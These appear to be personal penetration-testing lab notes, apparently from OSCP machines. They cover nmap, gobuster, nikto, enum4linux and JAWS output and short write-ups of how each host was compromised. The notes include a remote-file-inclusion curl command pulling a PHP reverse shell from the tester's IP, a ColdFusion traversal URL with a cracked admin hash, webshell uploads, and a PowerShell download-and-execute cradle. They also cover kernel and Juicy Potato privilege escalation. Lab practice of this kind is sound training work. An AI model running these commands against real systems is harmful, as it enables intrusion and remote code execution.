class='page'><h1 class='title level-2'>10.11.1.8 Phoenix</h1><br/>nmap showed that an assload of ports were open.<br />while enumerating 80 robots.txt pointed me towards /internal.<br />The source code of /internal showed me that the machine was running advanced commenting system.<br />searchsploit showed me that I could craft a curl command to get code execution.<br />curl -s “http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.167:443/80.txt%00”<br /><a href=""><img src="images/896-1.png" alt="images/896-1.png" /></a><br />note --I think the trailing %00 makes the file execute as a .php or maybe adds the extension and executes it.<br />80.txt is pentestmonkey&#39;s phpshell.php edited and renamed.<br />catch reverse shell with nc.<br />uname -a shows 2.6.9-89<br />This kernel is vulnerable to 9545 and 9542. 9545 I could not get to work, some kind of job handler thing.<br /><br />on the x86 kali I compiled the exploit and moved it via github<br />gcc -Wall -Wl,--hash-style=both -o 9542 9542.c<br /><br />uploaded with wget, chmoded, executed and popped a root shell in the same termainal.<br /><br />f56a325ef00d4553a4046b7eacc5d667</div><div class='page'><h1 class='title level-3'>enumeration</h1><br/>domain PHOENIX<br /><br /><br />gcc -Wall -o linux-sendpage linux-sendpage.c<br /><br />gcc -Wall -m64 -o linux-sendpage linux-sendpage.c</div><div class='page'><h1 class='title level-4'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.8 &amp;&amp; nmap -sC -sV -Pn 10.11.1.8 &amp;&amp; nmap -p- -Pn 10.11.1.8<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:03 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.53s latency).<br />Not shown: 990 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />22/tcp   open   ssh<br />25/tcp   closed smtp<br />80/tcp   open   http<br />111/tcp  open   rpcbind<br />139/tcp  open   netbios-ssn<br />443/tcp  open   https<br />445/tcp  open   microsoft-ds<br />631/tcp  open   ipp<br />3306/tcp open   mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 71.56 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:04 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.089s latency).<br />Not shown: 990 filtered ports<br />PORT     STATE  SERVICE     VERSION<br />21/tcp   open   ftp         vsftpd 2.0.1<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: ERROR<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 192.168.119.167<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 1<br />|      vsFTPd 2.0.1 - secure, fast, stable<br />|_End of status<br />22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)<br />|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)<br />|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)<br />|_sshv1: Server supports SSHv1<br />25/tcp   closed smtp<br />80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 2 disallowed entries <br />|_/internal/  /tmp/ <br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />111/tcp  open   rpcbind     2 (RPC #100000)<br />139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br />443/tcp  open   ssl/https?<br />|_ssl-date: 2020-04-26T19:05:48+00:00; +3h58m04s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_RC2_128_CBC_WITH_MD5<br />445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)<br />631/tcp  open   ipp         CUPS 1.1<br />| http-methods: <br />|_  Potentially risky methods: PUT<br />|_http-server-header: CUPS/1.1<br />|_http-title: 403 Forbidden<br />3306/tcp open   mysql?<br />|_mysql-info: ERROR: Script execution failed (use -d to debug)<br />Service Info: OS: Unix<br /><br />Host script results:<br />|_clock-skew: mean: 5h18m04s, deviation: 2h18m35s, median: 3h58m03s<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.33-0.17.el4)<br />|   Computer name: phoenix<br />|   NetBIOS computer name: <br />|   Domain name: <br />|   FQDN: phoenix<br />|_  System time: 2020-04-26T15:05:19-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 261.60 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:08 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.51s latency).<br />Not shown: 65524 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />22/tcp   open   ssh<br />25/tcp   closed smtp<br />80/tcp   open   http<br />111/tcp  open   rpcbind<br />139/tcp  open   netbios-ssn<br />443/tcp  open   https<br />445/tcp  open   microsoft-ds<br />631/tcp  open   ipp<br />868/tcp  closed unknown<br />3306/tcp open   mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1631.68 seconds</div><div class='page'><h1 class='title level-4'>web</h1><br/></div><div class='page'><h1 class='title level-5'>80</h1><br/></div><div class='page'><h1 class='title level-6'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.0.52 ((CentOS))<br />|_http-server-header: Apache/2.0.52 (CentOS)<br /></div><div class='page'><h1 class='title level-6'>gobust</h1><br/>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u <a href="http://10.11.1.8:80">http://10.11.1.8:80</a><br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://10.11.1.8:80">http://10.11.1.8:80</a><br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/04/26 11:44:41 Starting gobuster<br />===============================================================<br />/manual (Status: 301)<br />/usage (Status: 403)<br />/internal (Status: 301)<br />Progress: 23293 / 220561 (10.56%)^C<br />[!] Keyboard interrupt detected, terminating.<br />===============================================================<br />2020/04/26 11:50:39 Finished<br />===============================================================<br /></div><div class='page'><h1 class='title level-5'>443</h1><br/></div><div class='page'><h1 class='title level-4'>smb</h1><br/></div><div class='page'><h1 class='title level-5'>smb nmap</h1><br/>PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack<br />445/tcp open  microsoft-ds syn-ack<br /></div><div class='page'><h1 class='title level-5'>enum4linux</h1><br/>enum4linux -a 10.11.1.8<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sun Apr 26 11:25:27 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.8<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================= <br />|    Enumerating Workgroup/Domain on 10.11.1.8    |<br /> ================================================= <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ========================================= <br />|    Nbtstat Information for 10.11.1.8    |<br /> ========================================= <br />Looking up status of 10.11.1.8<br />No reply from 10.11.1.8<br /><br /> ================================== <br />|    Session Check on 10.11.1.8    |<br /> ================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.</div><div class='page'><h1 class='title level-3'>Pictures</h1><br/><br /><a href=""><img src="images/898-1.png" alt="images/898-1.png" /></a><br /><br /><a href=""><img src="images/898-2.png" alt="images/898-2.png" /></a><br /><br /><a href=""><img src="images/898-3.png" alt="images/898-3.png" /></a><br /><br /><a href=""><img src="images/898-4.png" alt="images/898-4.png" /></a><br /><br /><a href=""><img src="images/898-5.png" alt="images/898-5.png" /></a><br /><br /><a href=""><img src="images/898-6.png" alt="images/898-6.png" /></a><br /><br /><a href=""><img src="images/898-7.png" alt="images/898-7.png" /></a><br /><br /><a href=""><img src="images/898-8.png" alt="images/898-8.png" /></a><br /><br /><a href=""><img src="images/898-9.png" alt="images/898-9.png" /></a><br /><br /><a href=""><img src="images/898-10.png" alt="images/898-10.png" /></a><br /><br /></div><div class='page'><h1 class='title level-2'>10.11.1.10 Mike</h1><br/>Nmap showed that only 80 was open.<br />Nikto showed that the machine was running cold fusion 8.<br />Searchsploit showed that there was a potential directory traversal that would dump a hash of the admin creds.<br /><a href="http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en">http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a><br />AAFDC23870ECBCD3D557B6423A8982134E17927E<br />Ran the creds against hashcrack.com and got a match for &quot;pass123&quot;<br />The attempt to login was successful.<br />Looking at the Server Settings Mappings node told Chris where the root directory of ColdFusion was.<br />C:\Inetpub\wwwroot\CFIDE\<br />He created a scheduled task to upload a malicious .jsp file and write it to the root direcory of ColdFusion.<br />After he ran the scheduled task he navigated to http:\\10.11.1.10\CFIDE\443.jsp, executing the jsp file and giving him a reverse shell via nc.<br />The shell was already nt authority\system.</div><div class='page'><h1 class='title level-3'>enumeraton</h1><br/>windows server 2003/r2 or xp<br /><br /></div><div class='page'><h1 class='title level-4'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.10 &amp;&amp; nmap -sC -sV -Pn 10.11.1.10 &amp;&amp; nmap -p- -Pn 10.11.1.10<br />1<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.082s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.077s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.065s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 126.65 seconds<br /></div><div class='page'><h1 class='title level-4'>web</h1><br/></div><div class='page'><h1 class='title level-5'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 6.0<br />|_http-server-header: Microsoft-IIS/6.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>nikto -host <a href="http://10.11.1.10:80">http://10.11.1.10:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.10<br />+ Target Hostname:    10.11.1.10<br />+ Target Port:        80<br />+ Start Time:         2020-04-26 16:26:00 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/6.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Uncommon header &#39;server-error&#39; found, with contents: true<br />+ Cookie CFID created without the httponly flag<br />+ Cookie CFTOKEN created without the httponly flag<br />+ Cookie CFAUTHORIZATION_cfadmin created without the httponly flag<br />+ OSVDB-3399: /CFIDE/administrator/index.cfm: ColdFusion Administrator found. ColdFusion 4.5.1 and earlier may have an overflow by submitting a 40k character password. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.</a> <a href="http://www.securityfocus.com/bid/1314.">http://www.securityfocus.com/bid/1314.</a><br />+ Cookie CFAUTHORIZATION_componentutils created without the httponly flag<br />+ /CFIDE/componentutils/cfcexplorer.cfc: ColdFusion Component Browser. Default password may be &#39;admin&#39;.<br />+ Cookie JSESSIONID created without the httponly flag<br />+ /flex2gateway/http: Adobe BlazeDS identified.<br />+ /servlet/AxisServlet: Apache Axis web services reveals information about all installed web services. See <a href="http://ws.apache.org/axis/java/security.html">http://ws.apache.org/axis/java/security.html</a> to secure Axis.<br />+ 7891 requests: 2 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2020-04-26 16:37:29 (GMT-4) (689 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:/Yeet/Machines/OSCP/10$ <br /><br /></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/><a href=""><img src="images/1753-1.png" alt="images/1753-1.png" /></a><br /><br /><a href=""><img src="images/1753-2.png" alt="images/1753-2.png" /></a><br /><br /><a href=""><img src="images/1753-3.png" alt="images/1753-3.png" /></a><br /><br /><a href=""><img src="images/1753-4.png" alt="images/1753-4.png" /></a><br /><br /><a href=""><img src="images/1753-5.png" alt="images/1753-5.png" /></a><br /><br /><a href=""><img src="images/1753-6.png" alt="images/1753-6.png" /></a><br /><br /><a href=""><img src="images/1753-7.png" alt="images/1753-7.png" /></a><br /><br /><br /><a href=""><img src="images/1753-8.png" alt="images/1753-8.png" /></a><br /><br /><a href=""><img src="images/1753-9.png" alt="images/1753-9.png" /></a></div><div class='page'><h1 class='title level-2'>10.11.1.13 Disco</h1><br/>Nmap showed that many ports were open.<br />Chris was able to connect to ftp annonymously and upload files.<br />A all port nmap scan shoed that there was an iis server running on port 4167.<br />Upon further review the webroot of this iis server was also the ftproot.<br />He was able to navigate to a aspx webshell he uploaded and execute code.<br />In the .aspx webshell he was able to run a powershell command uploading Invoke-PowerShellTCP.ps1 into memory giving him a reverse shell as iis apppool\defaultapppool.<br />During enumeration he ran whoami /all, which showed him that iis apppool was had the seimpersonate token, which leaves the machine vulnerale to the juicy potato exploit.<br />When running the juicy potato exploit, he had the elevated process token call run.bat, which contained a powershell one-liner to call another Invoke-PowerShellTCP.ps1 into memory creating another reverse shell on a different port as nt authority\system. <br /><br /><br />0c012af5208bac5826bb9dd4d4caedf8</div><div class='page'><h1 class='title level-3'>enumeration</h1><br/>upload via ftp anonymous<br />x64<br /><br />powershell.exe &quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://192.168.119.167:80/3232.ps1')"">http://192.168.119.167:80/3232.ps1&#39;)&quot;</a><br /><br />Microsoft Windows Server 2012 R2 Standard </div><div class='page'><h1 class='title level-4'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.13 &amp;&amp; nmap -sC -sV -Pn 10.11.1.13 &amp;&amp; nmap -p- -Pn 10.11.1.13<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:43 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.063s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:44 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.067s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE            VERSION<br />21/tcp    open  ftp                Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 04-07-19  10:25PM       &lt;DIR&gt;          aspnet_client<br />| 04-25-20  09:34PM                 1400 cmdasp.aspx<br />| 04-07-19  07:14PM                99710 iis-85.png<br />| 04-07-19  07:14PM                  701 iisstart.htm<br />| 04-25-20  12:25PM                38136 loled.asp<br />| 04-25-20  12:33PM                 2736 loled.aspx<br />| 04-26-20  09:34PM                14286 Powerless.bat<br />|_04-25-20  12:15PM                 2063 tcp_445_smb_nmap.txt<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />135/tcp   open  msrpc              Microsoft Windows RPC<br />139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM<br />| ms-sql-ntlm-info: <br />|   Target_Name: DISCO<br />|   NetBIOS_Domain_Name: DISCO<br />|   NetBIOS_Computer_Name: DISCO<br />|   DNS_Domain_Name: disco<br />|   DNS_Computer_Name: disco<br />|_  Product_Version: 6.3.9600<br />| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br />| Not valid before: 2020-03-03T20:03:22<br />|_Not valid after:  2050-03-03T20:03:22<br />|_ssl-date: 2020-04-26T21:43:29+00:00; -2m25s from scanner time.<br />3389/tcp  open  ssl/ms-wbt-server?<br />| rdp-ntlm-info: <br />|   Target_Name: DISCO<br />|   NetBIOS_Domain_Name: DISCO<br />|   NetBIOS_Computer_Name: DISCO<br />|   DNS_Domain_Name: disco<br />|   DNS_Computer_Name: disco<br />|   Product_Version: 6.3.9600<br />|_  System_Time: 2020-04-26T21:43:18+00:00<br />| ssl-cert: Subject: commonName=disco<br />| Not valid before: 2020-04-24T12:07:49<br />|_Not valid after:  2020-10-24T12:07:49<br />5800/tcp  open  vnc-http           TightVNC (user: disco; VNC TCP port: 5900)<br />|_http-title: TightVNC desktop [disco]<br />5900/tcp  open  vnc                VNC (protocol 3.8)<br />|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br />|_ssl-date: ERROR: Script execution failed (use -d to debug)<br />|_sslv2: ERROR: Script execution failed (use -d to debug)<br />|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br />|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br />|_vnc-info: ERROR: Script execution failed (use -d to debug)<br />49152/tcp open  msrpc              Microsoft Windows RPC<br />49153/tcp open  msrpc              Microsoft Windows RPC<br />49154/tcp open  msrpc              Microsoft Windows RPC<br />49155/tcp open  msrpc              Microsoft Windows RPC<br />49156/tcp open  msrpc              Microsoft Windows RPC<br />49157/tcp open  msrpc              Microsoft Windows RPC<br />49158/tcp open  msrpc              Microsoft Windows RPC<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m24s, deviation: 0s, median: -2m25s<br />| ms-sql-info: <br />|   10.11.1.13:1433: <br />|     Version: <br />|       name: Microsoft SQL Server 2012 RTM<br />|       number: 11.00.2100.00<br />|       Product: Microsoft SQL Server 2012<br />|       Service pack level: RTM<br />|       Post-SP patches applied: false<br />|_    TCP port: 1433<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-26T21:43:18<br />|_  start_date: 2020-03-03T20:03:20<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 113.22 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:45 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.064s latency).<br />Not shown: 65517 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />4167/tcp  open  ddgn<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 109.07 seconds<br /></div><div class='page'><h1 class='title level-4'>users</h1><br/> Users<br />-----------------------------------------------------------<br />----------<br />Username: admin<br />Groups:   Users<br />----------<br />Username: Administrator<br />Groups:   Administrators<br />----------<br />Username: alice<br />Groups:   Users<br />----------<br />Username: backup<br />Groups:   Users<br />----------<br />Username: david<br />Groups:   Users<br />----------<br />Username: gary<br />Groups:   Users<br />----------<br />Username: Guest<br />Groups:   Guests<br />----------<br />Username: homer<br />Groups:   Users<br />----------<br />Username: john<br />Groups:   Users<br />----------<br />Username: lee<br />Groups:   Users<br />----------<br />Username: lisa<br />Groups:   Users<br />----------<br />Username: mark<br />Groups:   Users<br />----------<br />Username: ned<br />Groups:   Users<br />----------<br />Username: nick<br />Groups:   Users<br />----------<br />Username: tood<br />Groups:   Users</div><div class='page'><h1 class='title level-4'>privesc</h1><br/></div><div class='page'><h1 class='title level-5'>PowerUP</h1><br/>nothing</div><div class='page'><h1 class='title level-5'>Jaws</h1><br/>Running J.A.W.S. Enumeration<br />	- Gathering User Information<br />	- Gathering Processes, Services and Scheduled Tasks<br />	- Gathering Installed Software<br />	- Gathering File System Information<br />	- Looking for Simple Priv Esc Methods<br />############################################################<br />##     J.A.W.S. (Just Another Windows Enum Script)        ##<br />##                                                        ##<br />##           https://github.com/411Hall/JAWS              ##<br />##                                                        ##<br />############################################################<br /><br />Windows Version: Microsoft Windows Server 2012 R2 Standard<br />Architecture: AMD64<br />Hostname: DISCO<br />Current User: DISCO$<br />Current Time\Date: 04/27/2020 13:19:58<br /><br />-----------------------------------------------------------<br /> Users<br />-----------------------------------------------------------<br />----------<br />Username: admin<br />Groups:   Users<br />----------<br />Username: Administrator<br />Groups:   Administrators<br />----------<br />Username: alice<br />Groups:   Users<br />----------<br />Username: backup<br />Groups:   Users<br />----------<br />Username: david<br />Groups:   Users<br />----------<br />Username: gary<br />Groups:   Users<br />----------<br />Username: Guest<br />Groups:   Guests<br />----------<br />Username: homer<br />Groups:   Users<br />----------<br />Username: john<br />Groups:   Users<br />----------<br />Username: lee<br />Groups:   Users<br />----------<br />Username: lisa<br />Groups:   Users<br />----------<br />Username: mark<br />Groups:   Users<br />----------<br />Username: ned<br />Groups:   Users<br />----------<br />Username: nick<br />Groups:   Users<br />----------<br />Username: tood<br />Groups:   Users<br /><br />-----------------------------------------------------------<br /> Network Information<br />-----------------------------------------------------------<br /><br />Windows IP Configuration<br /><br /><br />Ethernet adapter Ethernet0:<br /><br />   Connection-specific DNS Suffix  . : <br />   IPv4 Address. . . . . . . . . . . : 10.11.1.13<br />   Subnet Mask . . . . . . . . . . . : 255.255.0.0<br />   Default Gateway . . . . . . . . . : 10.11.0.1<br /><br />Tunnel adapter isatap.{D162924A-0442-4EF9-8BB7-170757574023}:<br /><br />   Media State . . . . . . . . . . . : Media disconnected<br />   Connection-specific DNS Suffix  . : <br /><br />-----------------------------------------------------------<br /> Arp<br />-----------------------------------------------------------<br /><br />Interface: 10.11.1.13 --- 0xd<br />  Internet Address      Physical Address      Type<br />  10.11.0.1             00-50-56-9f-aa-3e     dynamic   <br />  10.11.1.101           00-50-56-9f-6f-c9     dynamic   <br />  10.11.1.111           00-50-56-9f-73-22     dynamic   <br />  10.11.1.222           00-50-56-9f-2e-79     dynamic   <br />  10.11.255.255         ff-ff-ff-ff-ff-ff     static    <br />  224.0.0.22            01-00-5e-00-00-16     static    <br />  224.0.0.252           01-00-5e-00-00-fc     static    <br /><br /><br />-----------------------------------------------------------<br /> NetStat<br />-----------------------------------------------------------<br /><br />Active Connections<br /><br />  Proto  Local Address          Foreign Address        State           PID<br />  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       588<br />  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       544<br />  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       496<br />  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2012<br />  TCP    0.0.0.0:4167           0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:5800           0.0.0.0:0              LISTENING       1196<br />  TCP    0.0.0.0:5900           0.0.0.0:0              LISTENING       1196<br />  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       384<br />  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       656<br />  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       696<br />  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       352<br />  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       452<br />  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       2040<br />  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       460<br />  TCP    10.11.1.13:139         0.0.0.0:0              LISTENING       4<br />  TCP    10.11.1.13:4167        192.168.119.167:38876  CLOSE_WAIT      4<br />  TCP    10.11.1.13:4167        192.168.119.167:38908  ESTABLISHED     4<br />  TCP    10.11.1.13:4167        192.168.119.167:39110  ESTABLISHED     4<br />  TCP    10.11.1.13:49168       192.168.119.167:3232   CLOSE_WAIT      1124<br />  TCP    10.11.1.13:49173       192.168.119.167:3232   ESTABLISHED     2656<br />  TCP    [::]:21                [::]:0                 LISTENING       588<br />  TCP    [::]:135               [::]:0                 LISTENING       544<br />  TCP    [::]:445               [::]:0                 LISTENING       4<br />  TCP    [::]:1433              [::]:0                 LISTENING       496<br />  TCP    [::]:3389              [::]:0                 LISTENING       2012<br />  TCP    [::]:4167              [::]:0                 LISTENING       4<br />  TCP    [::]:5985              [::]:0                 LISTENING       4<br />  TCP    [::]:47001             [::]:0                 LISTENING       4<br />  TCP    [::]:49152             [::]:0                 LISTENING       384<br />  TCP    [::]:49153             [::]:0                 LISTENING       656<br />  TCP    [::]:49154             [::]:0                 LISTENING       696<br />  TCP    [::]:49155             [::]:0                 LISTENING       352<br />  TCP    [::]:49156             [::]:0                 LISTENING       452<br />  TCP    [::]:49157             [::]:0                 LISTENING       2040<br />  TCP    [::]:49158             [::]:0                 LISTENING       460<br />  UDP    0.0.0.0:123            *:*                                    748<br />  UDP    0.0.0.0:500            *:*                                    696<br 